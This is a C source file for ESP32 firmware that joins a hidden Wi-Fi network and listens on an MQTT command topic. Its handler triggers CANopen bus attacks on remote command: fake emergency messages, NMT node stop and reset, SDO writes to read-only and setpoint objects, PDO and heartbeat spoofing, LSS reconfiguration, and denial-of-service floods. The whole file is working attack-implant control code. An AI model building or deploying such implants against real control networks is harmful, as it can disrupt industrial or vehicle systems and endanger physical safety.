#include "wifi_mqtt.h"
#include "config.h"
#include "can_attack.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "mqtt_client.h"
#include <string.h>

static const char *TAG = "WIFI_MQTT";

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1

static EventGroupHandle_t wifi_event_group;
static int s_retry_num = 0;
static esp_mqtt_client_handle_t mqtt_client = NULL;

static void wifi_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data)
{
    if (base == WIFI_EVENT && id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_retry_num < WIFI_MAX_RETRY) {
            esp_wifi_connect();
            s_retry_num++;
            ESP_LOGI(TAG, "Retry WiFi connection (%d)", s_retry_num);
        } else {
            xEventGroupSetBits(wifi_event_group, WIFI_FAIL_BIT);
        }
    } else if (base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)data;
        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        s_retry_num = 0;
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

esp_err_t wifi_init_sta_hidden(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL, NULL));

    wifi_config_t wifi_cfg = {
        .sta = {
            .ssid = WIFI_SSID,
            .password = WIFI_PASSWORD,
            .scan_method = WIFI_ALL_CHANNEL_SCAN,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = { .capable = true, .required = false },
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_cfg));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Connecting to hidden SSID '%s'...", WIFI_SSID);

    EventBits_t bits = xEventGroupWaitBits(
        wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
        pdFALSE, pdFALSE, pdMS_TO_TICKS(30000));

    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAG, "WiFi connected");
        return ESP_OK;
    }
    ESP_LOGE(TAG, "WiFi connection failed");
    return ESP_FAIL;
}

static bool eq(const char *a, const char *b) { return strcmp(a, b) == 0; }

static void handle_mqtt_command(const char *topic, int topic_len,
                                const char *data, int data_len)
{
    char cmd[64] = {0};
    int n = data_len < (int)sizeof(cmd) - 1 ? data_len : (int)sizeof(cmd) - 1;
    memcpy(cmd, data, n);

    ESP_LOGW(TAG, "[CMD] Received: %s", cmd);

    if (eq(cmd, ATTACK_STOP)) {
        can_stop_attack();
        mqtt_publish_status("attack_stopped");

    } else if (eq(cmd, ATTACK_EMCY_FAKE)) {
        can_send_fake_emcy(0x8100, 0x10);
        mqtt_publish_status("emcy_fake_sent");
    } else if (eq(cmd, ATTACK_EMCY_OVERVOLT)) {
        can_send_fake_emcy(0x3210, 0x04);
        mqtt_publish_status("emcy_overvolt_sent");
    } else if (eq(cmd, ATTACK_EMCY_FLOOD)) {
        can_start_emcy_flood(100);
        mqtt_publish_status("emcy_flood_started");

    } else if (eq(cmd, ATTACK_NMT_PREOP)) {
        can_send_nmt(NMT_CS_ENTER_PREOP);
        mqtt_publish_status("nmt_preop_sent");
    } else if (eq(cmd, ATTACK_NMT_STOP)) {
        can_send_nmt(NMT_CS_STOP_NODE);
        mqtt_publish_status("nmt_stop_sent");
    } else if (eq(cmd, ATTACK_NMT_RESET)) {
        can_send_nmt(NMT_CS_RESET_NODE);
        mqtt_publish_status("nmt_reset_sent");

    } else if (eq(cmd, ATTACK_SDO_READ_RO)) {
        can_sdo_read(OD_HEARTBEAT_TIME_INDEX, 0x00);
        mqtt_publish_status("sdo_read_ro_sent");
    } else if (eq(cmd, ATTACK_SDO_WRITE_SP)) {
        can_sdo_write_u16(OD_SETPOINT_INDEX, 0x00, 0xBEEF);
        mqtt_publish_status("sdo_write_sp_sent");
    } else if (eq(cmd, ATTACK_SDO_WRITE_RO)) {
        can_sdo_write_u16(OD_HEARTBEAT_TIME_INDEX, 0x00, 0x0001);
        mqtt_publish_status("sdo_write_ro_sent");
    } else if (eq(cmd, ATTACK_SDO_FLOOD)) {
        can_start_sdo_flood(20);
        mqtt_publish_status("sdo_flood_started");

    } else if (eq(cmd, ATTACK_PDO_SPOOF)) {
        uint8_t payload[8] = {0xFF, 0xFF, 0x13, 0x37, 0xCA, 0xFE, 0x00, 0x00};
        can_send_pdo_spoof(TPDO1_COB_ID(VICTIM_NODE_ID), payload);
        mqtt_publish_status("pdo_spoof_sent");
    } else if (eq(cmd, ATTACK_PDO_FLOOD)) {
        can_start_pdo_flood(10);
        mqtt_publish_status("pdo_flood_started");

    } else if (eq(cmd, ATTACK_HB_SPOOF)) {
        can_start_hb_spoof(0x05, 1000);
        mqtt_publish_status("hb_spoof_started");
    } else if (eq(cmd, ATTACK_HB_GHOST)) {
        can_start_hb_ghost(GHOST_NODE_ID, 1000);
        mqtt_publish_status("hb_ghost_started");

    } else if (eq(cmd, ATTACK_LSS_SWITCH)) {
        can_lss_set_node_id(0x10);
        mqtt_publish_status("lss_switch_sent");
    } else if (eq(cmd, ATTACK_LSS_BITRATE)) {
        can_lss_set_bitrate(0x02);
        mqtt_publish_status("lss_bitrate_sent");

    } else if (eq(cmd, ATTACK_DOS_FLOOD)) {
        can_start_dos_flood(0);
        mqtt_publish_status("dos_flood_started");

    } else {
        ESP_LOGW(TAG, "Unknown command: %s", cmd);
        mqtt_publish_status("unknown_command");
    }
}

static void mqtt_event_handler(void *args, esp_event_base_t base,
                               int32_t id, void *event_data)
{
    esp_mqtt_event_handle_t event = (esp_mqtt_event_handle_t)event_data;

    switch ((esp_mqtt_event_id_t)id) {
    case MQTT_EVENT_CONNECTED:
        ESP_LOGI(TAG, "MQTT connected, subscribing to %s", MQTT_CMD_TOPIC);
        esp_mqtt_client_subscribe(event->client, MQTT_CMD_TOPIC, 1);
        mqtt_publish_status("online");
        break;
    case MQTT_EVENT_DISCONNECTED:
        ESP_LOGW(TAG, "MQTT disconnected");
        break;
    case MQTT_EVENT_DATA:
        handle_mqtt_command(event->topic, event->topic_len,
                            event->data, event->data_len);
        break;
    case MQTT_EVENT_ERROR:
        ESP_LOGE(TAG, "MQTT error");
        break;
    default:
        break;
    }
}

esp_err_t mqtt_start(void)
{
    esp_mqtt_client_config_t cfg = {
        .broker.address.uri = MQTT_BROKER_URI,
    };
    mqtt_client = esp_mqtt_client_init(&cfg);
    if (!mqtt_client) return ESP_FAIL;

    esp_mqtt_client_register_event(mqtt_client, ESP_EVENT_ANY_ID,
                                   mqtt_event_handler, NULL);
    return esp_mqtt_client_start(mqtt_client);
}

void mqtt_publish_status(const char *msg)
{
    if (mqtt_client) {
        esp_mqtt_client_publish(mqtt_client, MQTT_STATUS_TOPIC, msg, 0, 1, 0);
    }
}
